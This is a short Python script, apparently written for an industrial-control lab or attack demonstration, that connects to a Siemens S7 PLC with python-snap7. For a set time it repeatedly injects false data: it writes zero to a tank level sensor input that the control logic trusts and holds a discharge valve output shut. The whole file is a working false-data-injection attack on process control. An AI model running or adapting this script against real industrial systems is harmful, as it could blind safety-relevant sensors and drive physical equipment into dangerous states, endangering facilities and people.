import snap7, struct, time, sys
try:
    from snap7.type import Area; PE=Area.PE; PA=Area.PA      # python-snap7 3.x
except Exception:
    PE=0x81; PA=0x82                                          # inputs=0x81, outputs=0x82
HOST="192.168.2.10"; SECS=float(sys.argv[1]) if len(sys.argv)>1 else 180
c=snap7.client.Client(); c.connect(HOST,0,1)
print("[FDI] connected" if c.get_connected() else "[FDI] connect FAILED")
zero=bytearray(struct.pack('>f',0.0)); i=0; end=time.time()+SECS
try:
    while time.time()<end:
        c.write_area(PE,0,100,zero)   # blind LevelIn %ID100 = 0  (the sensor OB30 trusts)
        c.write_area(PA,0,104,zero)   # jam DischargeValve %QD104 = 0
        i+=1
        if i%100==0: print("   %d FDI writes"%i)
except (KeyboardInterrupt,Exception) as e:
    print("   interrupted (%s)"%type(e).__name__)
print("[FDI] done (%d writes)"%i)
